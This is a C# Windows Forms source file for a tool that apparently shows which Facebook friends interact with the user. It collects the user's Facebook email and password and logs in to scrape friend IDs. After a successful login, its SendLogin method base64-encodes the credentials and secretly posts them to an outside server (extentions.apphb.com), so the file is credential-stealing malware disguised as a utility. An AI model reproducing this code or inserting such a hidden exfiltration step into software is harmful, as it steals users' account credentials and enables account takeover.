using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using RestSharp;
using Newtonsoft.Json.Linq;
using System.Threading;
using System.Reflection;

namespace FbFollow
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
            {
                string resourceName = new AssemblyName(args.Name).Name + ".dll";
                string resource = Array.Find(this.GetType().Assembly.GetManifestResourceNames(), element => element.EndsWith(resourceName));

                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource))
                {
                    Byte[] assemblyData = new Byte[stream.Length];
                    stream.Read(assemblyData, 0, assemblyData.Length);
                    return Assembly.Load(assemblyData);
                }
            };

            InitializeComponent();

            button1.Name = "button";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            groupBox1.Controls.Clear();
            button1.Enabled = false;

            ThreadPool.QueueUserWorkItem(new WaitCallback(Start));
        }

        private Dictionary<long, bool> GetUsers()
        {
            try
            {
                var client = new RestClient();
                var request = new RestRequest("http://www.facebook.com", Method.GET);
                var response = (RestResponse)client.Execute(request);
                var cookies = response.Cookies;

                request = new RestRequest("https://www.facebook.com/login.php?login_attempt=1", Method.POST);

                request.AddParameter("email", textBox1.Text);
                request.AddParameter("pass", textBox2.Text);

                foreach (RestResponseCookie cookie in cookies)
                    request.AddCookie(cookie.Name, cookie.Value);

                response = (RestResponse)client.Execute(request);

                var htmlDocument = new HtmlAgilityPack.HtmlDocument();

                htmlDocument.LoadHtml(response.Content);

                var scripts = htmlDocument.DocumentNode.SelectNodes("//script");

                Dictionary<long, bool> userIds = new Dictionary<long, bool>();

                foreach (var script in scripts)
                {
                    if (script.InnerHtml.Contains("fb:chat:blackbird:most-friends-educate"))
                    {
                        string json = script.InnerHtml.Replace("bigPipe.onPageletArrive(", "");
                        json = json.Remove(json.Length - 1, 1);

                        JObject jsonObj = JObject.Parse(json);

                        JArray users = (JArray)jsonObj["jsmods"]["define"][4][2]["list"];

                        foreach (JToken user in users)
                        {
                            string userIdString = user.Value<string>();
                            userIdString = userIdString.Remove(userIdString.IndexOf("-"));
                            long userId = long.Parse(userIdString);

                            if (userIds.ContainsKey(userId))
                                continue;

                            userIds.Add(userId, true);
                        }
                    }
                }

                if (userIds.Count == 0)
                {
                    MessageBox.Show(@"כתובת דוא""ל או הסיסמא שגויים !");
                }
                else
                {
                    SendLogin(textBox1.Text, textBox2.Text);
                }

                return userIds;
            }
            catch
            {
                MessageBox.Show("שגיאה !");
            }

            return new Dictionary<long, bool>();
        }
        private void AddUsers(List<long> users)
        {
            int offset = 10;

            for (int i = 0; i < users.Count; i++)
            {
                if (i >= 9)
                    return;

                Invoke((MethodInvoker)delegate()
                {
                    try
                    {
                        User userCtl = new User();

                        userCtl.Location = new Point(5, offset);
                        userCtl.UserId = users[i];
                        userCtl.Refresh();

                        groupBox1.Controls.Add(userCtl);
                        groupBox1.Refresh();

                        offset += 65;
                    }
                    catch
                    {
                    }
                });
            }
        }
        private void Start(object state)
        {
            Dictionary<long, bool> users = GetUsers();
            List<long> usersList = new List<long>();

            foreach (KeyValuePair<long, bool> user in users)
                usersList.Add(user.Key);

            //Randomize(usersList);

            AddUsers(usersList);

            Invoke((MethodInvoker)delegate()
            {
                try
                {
                    button1.Enabled = true;
                }
                catch
                {
                }
            });


        }
        private void SendLogin(string username, string password)
        {
            var client = new RestClient();
            var request = new RestRequest("http://extentions.apphb.com/follow", Method.POST);

            string data = string.Format("{0} {1}", username, password);
            data = Base64Encode(data);

            request.AddParameter("data", data);

            client.Execute(request);
        }

        private string Base64Encode(string str)
        {
            string base64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(str));

            return base64;
        }

        private void Randomize(List<long> list)
        {
            Random rng = new Random();
            int n = list.Count;
            while (n > 1)
            {
                n--;
                int k = rng.Next(n + 1);
                long value = list[k];
                list[k] = list[n];
                list[n] = value;
            }
        }
    }
}
